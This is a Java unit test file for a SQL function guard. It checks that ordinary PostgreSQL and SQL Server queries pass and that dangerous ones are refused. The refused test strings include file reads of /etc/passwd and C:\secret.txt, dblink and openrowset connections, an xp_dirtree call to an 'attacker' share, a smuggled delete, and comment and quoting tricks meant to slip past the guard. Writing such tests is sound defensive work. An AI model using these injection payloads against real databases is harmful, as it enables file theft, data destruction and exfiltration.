package de.savas.businessinsightapi.application.insight;

import de.savas.businessinsightapi.domain.insight.datasource.DataSourceType;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;

import static org.assertj.core.api.Assertions.assertThat;

class SqlFunctionGuardTest {

    private final SqlFunctionGuard guard = new SqlFunctionGuard();

    @ParameterizedTest
    @ValueSource(strings = {
            "select to_char(order_date, 'YYYY-MM') as month, sum(amount) from orders group by 1",
            "select lo_total, my_lo_value(x), pg_sleep_count from stats",
            "select 'pg_read_file(''/etc/passwd'')' as note",
            "select 1 -- pg_sleep(10)\n",
            "select 1 /* dblink('host', 'q') */",
            "select $$pg_read_file('x')$$ as text",
            "select coalesce(a, b), count(*) from t where c = :param",
            "select \"pg_read_file\" from columns_named_like_functions",
            "select pg_sleep(0.1), 1 as x"
    })
    void allowsOrdinaryPostgresQueries(String sql) {
        assertThat(guard.check(sql, DataSourceType.POSTGRES)).as(sql).isEmpty();
    }

    @ParameterizedTest
    @ValueSource(strings = {
            "select pg_read_file('/etc/passwd')",
            "select PG_READ_FILE ('/etc/passwd')",
            "select \"pg_read_file\"('/etc/passwd')",
            "select pg_catalog.pg_read_file('/etc/passwd')",
            "select \"pg_catalog\".\"pg_read_file\"('/etc/passwd')",
            "select pg_read_file/**/('/etc/passwd')",
            "select pg_read_file -- comment\n('/etc/passwd')",
            "select pg_ls_dir('.')",
            "select lo_import('/etc/passwd')",
            "select * from dblink('host=10.0.0.5', 'select 1') as t(x int)",
            "select query_to_xml('delete from orders returning 1', true, true, '')",
            "select * from ts_stat('select to_tsvector(secret) from vault')",
            "select set_config('statement_timeout', '0', false)",
            "select pg_terminate_backend(123)",
            // Lexing tricks: each one hides the call under one reading of the rules.
            "select E'\\'', pg_read_file('/etc/passwd') --'",
            "select 'a\\', pg_read_file('/etc/passwd'), '",
            "select 1 /* /* */ , pg_read_file('/etc/passwd') /* */",
            "select 1 /* /* */ */ , pg_read_file('/etc/passwd')",
            "select a$x$, pg_read_file('/etc/passwd'), $x$ from t",
            "select $$x$$, pg_read_file('/etc/passwd')"
    })
    void refusesPostgresFunctionsThatReachOutside(String sql) {
        assertThat(guard.check(sql, DataSourceType.POSTGRES)).as(sql).isPresent();
    }

    @ParameterizedTest
    @ValueSource(strings = {
            "select top 10 [order id], xp_total from dbo.orders",
            "select 'openquery(x)' as note",
            "select [openrowset] from t"
    })
    void allowsOrdinarySqlServerQueries(String sql) {
        assertThat(guard.check(sql, DataSourceType.MSSQL)).as(sql).isEmpty();
    }

    @ParameterizedTest
    @ValueSource(strings = {
            "select * from openrowset('SQLNCLI', 'Server=x;Trusted_Connection=yes', 'select 1')",
            "select * from OPENQUERY(linked, 'select 1')",
            "select * from opendatasource('SQLNCLI', 'Data Source=x').db.dbo.t",
            "select * from openrowset(bulk 'C:\\secret.txt', single_clob) as f",
            "select * from sys.fn_trace_gettable('C:\\log.trc', default)",
            "select * from [sys].[fn_get_audit_file]('C:\\*', default, default)",
            "select [xp_dirtree]('\\\\attacker\\share')",
            "select * from openquery/**/(linked, 'select 1')"
    })
    void refusesSqlServerFunctionsThatReachOutside(String sql) {
        assertThat(guard.check(sql, DataSourceType.MSSQL)).as(sql).isPresent();
    }
}
